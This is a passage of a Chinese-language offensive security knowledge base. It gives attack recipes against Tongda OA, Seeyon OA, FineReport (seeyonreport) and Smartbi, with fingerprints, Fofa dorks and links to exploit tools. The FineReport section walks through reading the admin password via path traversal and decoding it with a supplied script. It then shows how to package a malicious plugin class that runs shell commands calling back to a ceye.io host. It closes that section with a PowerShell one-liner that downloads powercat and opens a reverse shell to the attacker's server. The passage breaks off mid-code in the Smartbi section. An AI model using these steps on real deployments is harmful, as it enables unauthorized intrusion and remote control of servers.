    >https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞
<a class="link" href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User"  target="_blank" rel="noopener"
    >https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
<p>tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell
<a class="link" href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py"  target="_blank" rel="noopener"
    >https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p>
<p>绕过disable_function也很简单, 直接调用<code>COM('WScript.shell')</code>组件就ok了</p>
<p>2.文件名结构规则如下</p>
<p><code>256@2003_ 2055499620|123. php.</code></p>
<p>对应文件名为</p>
<p><code>attach/im/2003/2055499620.123.php</code></p>
<p>因为是windows的, <code>1.php.</code> 可以绕过黑名单, 写到文件就成了 <code>1.php</code> (<del>这里是文件包含, 文件名无所谓</del>)</p>
<p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p>
<p>(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)</p>
<p>通达OA前台任意用户伪造登录漏洞
<a class="link" href="https://vas.riskivy.com/vuln-detail?id=33"  target="_blank" rel="noopener"
    >https://vas.riskivy.com/vuln-detail?id=33</a></p>
<p>NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞
<a class="link" href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User"  target="_blank" rel="noopener"
    >https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h2 id="致远-oa-a8-htmlofficeservlet-getshell-漏洞">致远 OA A8 htmlofficeservlet getshell 漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</p>
<p><strong>2. 影响组件</strong>
致远 OA</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>/seeyon/htmlofficeservlet</code></p>
<p><code>/seeyon/index.jsp</code></p>
<p><code>seeyon</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;用友-致远OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog
<a class="link" href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/"  target="_blank" rel="noopener"
    >http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list
<a class="link" href="https://github.com/timwhitez/seeyon-OA-A8-GetShell"  target="_blank" rel="noopener"
    >https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p>
<p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog
<a class="link" href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/"  target="_blank" rel="noopener"
    >http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
<p>这里还有个XXE</p>
<p>致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog
<a class="link" href="https://landgrey.me/blog/8/"  target="_blank" rel="noopener"
    >https://landgrey.me/blog/8/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题</p>
<p>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊</p>
<p>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from sys import argv
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">letters = &#34;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def base64_encode(input_str):
</span></span><span class="line"><span class="cl">    str_ascii_list = [&#39;{:0&gt;8}&#39;.format(str(bin(ord(i))).replace(&#39;0b&#39;, &#39;&#39;))
</span></span><span class="line"><span class="cl">                      for i in input_str]
</span></span><span class="line"><span class="cl">    output_str = &#39;&#39;
</span></span><span class="line"><span class="cl">    equal_num = 0
</span></span><span class="line"><span class="cl">    while str_ascii_list:
</span></span><span class="line"><span class="cl">        temp_list = str_ascii_list[:3]
</span></span><span class="line"><span class="cl">        if len(temp_list) != 3:
</span></span><span class="line"><span class="cl">            while len(temp_list) &lt; 3:
</span></span><span class="line"><span class="cl">                equal_num += 1
</span></span><span class="line"><span class="cl">                temp_list += [&#39;0&#39; * 8]
</span></span><span class="line"><span class="cl">        temp_str = &#39;&#39;.join(temp_list)
</span></span><span class="line"><span class="cl">        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
</span></span><span class="line"><span class="cl">        temp_str_list = [int(x, 2) for x in temp_str_list]
</span></span><span class="line"><span class="cl">        if equal_num:
</span></span><span class="line"><span class="cl">            temp_str_list = temp_str_list[0:4 - equal_num]
</span></span><span class="line"><span class="cl">        output_str += &#39;&#39;.join([letters[x] for x in temp_str_list])
</span></span><span class="line"><span class="cl">        str_ascii_list = str_ascii_list[3:]
</span></span><span class="line"><span class="cl">    output_str = output_str + &#39;=&#39; * equal_num
</span></span><span class="line"><span class="cl">    return output_str
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def base64_decode(input_str):
</span></span><span class="line"><span class="cl">    str_ascii_list = [&#39;{:0&gt;6}&#39;.format(str(bin(letters.index(i))).replace(&#39;0b&#39;, &#39;&#39;))
</span></span><span class="line"><span class="cl">                      for i in input_str if i != &#39;=&#39;]
</span></span><span class="line"><span class="cl">    output_str = &#39;&#39;
</span></span><span class="line"><span class="cl">    equal_num = input_str.count(&#39;=&#39;)
</span></span><span class="line"><span class="cl">    while str_ascii_list:
</span></span><span class="line"><span class="cl">        temp_list = str_ascii_list[:4]
</span></span><span class="line"><span class="cl">        temp_str = &#39;&#39;.join(temp_list)
</span></span><span class="line"><span class="cl">        if len(temp_str) % 8 != 0:
</span></span><span class="line"><span class="cl">            temp_str = temp_str[0:-1 * equal_num * 2]
</span></span><span class="line"><span class="cl">        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]
</span></span><span class="line"><span class="cl">        temp_str_list = [int(x, 2) for x in temp_str_list if x]
</span></span><span class="line"><span class="cl">        output_str += &#39;&#39;.join([chr(x) for x in temp_str_list])
</span></span><span class="line"><span class="cl">        str_ascii_list = str_ascii_list[4:]
</span></span><span class="line"><span class="cl">    return output_str
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
</span></span><span class="line"><span class="cl">    if len(argv) == 2:
</span></span><span class="line"><span class="cl">        print(base64_decode(argv[1]))
</span></span><span class="line"><span class="cl">    elif len(argv) == 3:
</span></span><span class="line"><span class="cl">        if argv[1] == &#39;-d&#39;:
</span></span><span class="line"><span class="cl">            print(base64_decode(argv[2]))
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            print(base64_encode(argv[2]))
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        print(&#34;Seeyon OA /seeyon/htmlofficeservlet param encode/decode&#34;)
</span></span><span class="line"><span class="cl">        print(&#34;Usage:&#34;)
</span></span><span class="line"><span class="cl">        print(&#34;python %s encoded_str&#34; % argv[0])t
</span></span><span class="line"><span class="cl">        print(&#34;python %s -d encoded_str&#34; % argv[0])
</span></span><span class="line"><span class="cl">        print(&#34;python %s -e raw_str&#34; % argv[0])
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h2 id="致远oa-帆软报表-seeyonreport-远程代码执行">[致远OA] 帆软报表 seeyonreport 远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点</p>
<p><strong>2. 影响组件</strong></p>
<p>帆软报表 seeyonreport</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</code></p>
<p><code>seeyonreport</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;用友-致远OA&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog
<a class="link" href="http://foreversong.cn/archives/1378"  target="_blank" rel="noopener"
    >http://foreversong.cn/archives/1378</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog
<a class="link" href="http://foreversong.cn/archives/1378"  target="_blank" rel="noopener"
    >http://foreversong.cn/archives/1378</a></p>
<p>xray/finereport-directory-traversal.yml at master · chaitin/xray
<a class="link" href="https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml"  target="_blank" rel="noopener"
    >https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml</a>
<strong>7. 利用技巧</strong></p>
<p>1.未设置密码或者读取读取管理员密码
<a class="link" href="https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892"  target="_blank" rel="noopener"
    >https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&cmd=fs_signin&_=1560911828892</a></p>
<p>这里很有可能是没有设置密码的, 修改密码进入后台就可以了</p>
<p>如果设置里密码, 尝试这个接口 <code>/report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml</code>, 读取管理员密码, 然后使用上文的解密程序解密</p>
<p>2.后台getshell
这种后台能装插件的都随便getshell</p>
<p>先去下载一个指定版本的jar包</p>
<p>本地测试环境是9.0</p>
<p>下载com.fr.plugin.external-1.3.4.zip
<a class="link" href="https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66"  target="_blank" rel="noopener"
    >https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66</a></p>
<p><a class="link" href="http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA="  target="_blank" rel="noopener"
    >http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=</a></p>
<p>编译一个恶意的class打包进去</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">package</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="n">fr</span><span class="p">.</span><span class="n">plugin</span><span class="p">.</span><span class="n">external</span><span class="p">.</span><span class="n">locale</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Process</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">public</span><span class="w"> </span><span class="n">class</span><span class="w"> </span><span class="n">LocaleFinder</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="nf">LocaleFinder</span><span class="p">()</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">InterruptedException</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="p">[]</span><span class="w"> </span><span class="n">commands</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="nf">getProperty</span><span class="p">(</span><span class="s2">&#34;os.name&#34;</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">().</span><span class="nf">contains</span><span class="p">(</span><span class="s2">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">commands</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">String</span><span class="p">[]</span><span class="err">{</span><span class="s2">&#34;C:\\Windows\\System32\\cmd&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;ping -nc 3 %username%.win.seeyonreport.ceyedoamin.ceye.io&#34;</span><span class="err">}</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">commands</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">String</span><span class="p">[]</span><span class="err">{</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;curl `whoami`.linux.seeyonreport.ceyedoamin.ceye.io&#34;</span><span class="err">}</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">rt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Process</span><span class="w"> </span><span class="n">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="n">commands</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">pc</span><span class="p">.</span><span class="nf">waitFor</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span><span class="w"> </span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">InterruptedException</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LocaleFinder</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="nf">LocaleFinder</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>复制LocaleFinder.class到
<code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></p>
<p>进入到插件管理界面, 上传符合规范的jar包插件即可
没生效就访问一下 <code>https://xxxx/seeyonreport/ReportServer?op=im</code></p>
<p>一般后台都是win, 可以直接使用powershell进行反弹shell</p>
<p><code>powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps_ip -p 6666 -e cmd</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用waf拦截</p>
<h2 id="smartbi-前台sql注入">Smartbi 前台SQL注入</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p>
<p><strong>2. 影响组件</strong>
Smartbi</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>SmartBi</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Smartbi&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）
<a class="link" href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p>
<p>漏洞文件
<code>vision/userListManager.jsp</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function doDel(){
</span></span><span class="line"><span class="cl">   var ids = [];
</span></span><span class="line"><span class="cl">   // 全选
</span></span><span class="line"><span class="cl">   if($(&#34;#checkAll&#34;).checked){
</span></span><span class="line"><span class="cl">      if(curRows){
</span></span><span class="line"><span class="cl">         curRows.forEach(function(val, index){
</span></span><span class="line"><span class="cl">            ids.push(val.id);
</span></span><span class="line"><span class="cl">         });
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">   }else{
</span></span><span class="line"><span class="cl">      if(curRows){
</span></span><span class="line"><span class="cl">         $(&#34;[name=&#39;checkTr&#39;]&#34;).each(function(){
</span></span><span class="line"><span class="cl">            if(this.checked){
</span></span><span class="line"><span class="cl">               ids.push(this.id);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">         });
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">   if(ids &amp;&amp; ids.length &gt; 0){
</span></span><span class="line"><span class="cl">      if(!canOpt()){
</span></span><span class="line"><span class="cl">         alert(&#34;&lt;%=StringUtil.getLanguageValue(&#34;Youdonothavepermissiontodoso&#34;)%&gt;&#34;);
</span></span><span class="line"><span class="cl">         return;
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">      var msg = &#34;&lt;%=StringUtil.getLanguageValue(&#34;Suredelete?&#34;)%&gt;&#34;;
</span></span><span class="line"><span class="cl">      var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;
</span></span><span class="line"><span class="cl">      alert(msg, &#34;&lt;%=StringUtil.getLanguageValue(&#34;Removetips&#34;)%&gt;&#34;, flags, function(ret) {
</span></span><span class="line"><span class="cl">         if (ret == modalWindow.ID_YES) {
</span></span><span class="line"><span class="cl">            var ret = jsloader.resolve(&#34;freequery.common.util&#34;).remoteInvokeEx2(&#34;BIConfigService&#34;, &#34;delUsers&#34;, [ids]);
</span></span><span class="line"><span class="cl">            if(ret &amp;&amp; ret.result == 1){
</span></span><span class="line"><span class="cl">               alert(&#34;&lt;%=StringUtil.getLanguageValue(&#34;Deletedsuccessfully&#34;)%&gt;&#34;);
</span></span><span class="line"><span class="cl">               refresh();
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">         }
</span></span><span class="line"><span class="cl">      }, this);
</span></span><span class="line"><span class="cl">   }else{
</span></span><span class="line"><span class="cl">      alert(&#34;&lt;%=StringUtil.getLanguageValue(&#34;Noselectedobjectyouwanttodelete&#34;)%&gt;&#34;);
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public int delUsers(List&lt;String&gt; ids) {
</span></span><span class="line"><span class="cl">    boolean succ = true;
</span></span><span class="line"><span class="cl">    String idStr = &#34;&#34;;
</span></span><span class="line"><span class="cl">    if (ids != null &amp;&amp; ids.size() &gt; 0) {
</span></span><span class="line"><span class="cl">        for(int i = 0; i &lt; ids.size(); ++i) {
</span></span><span class="line"><span class="cl">            if (i == 0) {
</span></span><span class="line"><span class="cl">                idStr = &#34;(&#39;&#34; + (String)ids.get(i) + &#34;&#39;&#34;;
</span></span><span class="line"><span class="cl">            } else {
</span></span><span class="line"><span class="cl">                idStr = idStr + &#34;, &#34; + &#34;&#39;&#34; + (String)ids.get(i) + &#34;&#39;&#34;;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        idStr = idStr + &#34;)&#34;;
</span></span><span class="line"><span class="cl">        Connection conn = null;
</span></span><span class="line"><span class="cl">        PreparedStatement prep = null;
</span></span><span class="line"><span class="cl">        Object rs = null;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        try {
</span></span><span class="line"><span class="cl">            conn = DbUtil.getRepoConnection();
</span></span><span class="line"><span class="cl">            conn.setAutoCommit(false);
</span></span><span class="line"><span class="cl">            String sqlUser = &#34;delete from t_user where c_userid in &#34; + idStr;
</span></span><span class="line"><span class="cl">            String sqlUserAttr = &#34;delete from t_userattr where c_userid in &#34; + idStr;
</span></span><span class="line"><span class="cl">            String sqlUserconfig = &#34;delete from t_userconfig where c_userid in &#34; + idStr;
</span></span><span class="line"><span class="cl">            String sqlUserRole = &#34;delete from t_user_role where c_userid in &#34; + idStr;
</span></span><span class="line"><span class="cl">            String sqlUserGroup = &#34;delete from t_group_user where c_userid in &#34; + idStr;
</span></span><span class="line"><span class="cl">            prep = conn.prepareStatement(sqlUser);
</span></span><span class="line"><span class="cl">            prep.execute();
</span></span><span class="line"><span class="cl">            prep = conn.prepareStatement(sqlUserAttr);
</span></span><span class="line"><span class="cl">            prep.execute();
</span></span><span class="line"><span class="cl">            prep = conn.prepareStatement(sqlUserconfig);
</span></span><span class="line"><span class="cl">            prep.execute();
</span></span><span class="line"><span class="cl">            prep = conn.prepareStatement(sqlUserRole);
</span></span><span class="line"><span class="cl">            prep.execute();
</span></span><span class="line"><span class="cl">            prep = conn.prepareStatement(sqlUserGroup);
</span></span><span class="line"><span class="cl">            prep.execute();
</span></span><span class="line"><span class="cl">            conn.commit();
</span></span><span class="line"><span class="cl">        } catch (Exception var17) {
</span></span><span class="line"><span class="cl">            try {
</span></span><span class="line"><span class="cl">                succ = false;
</span></span><span class="line"><span class="cl">                conn.rollback();
</span></span><span class="line"><span class="cl">            } catch (SQLException var16) {
</span></span><span class="line"><span class="cl">                throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
</span></span><span class="line"><span class="cl">        } finally {
</span></span><span class="line"><span class="cl">            DbUtil.closeDBObject((ResultSet)rs, prep, conn);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        return succ ? 1 : 0;
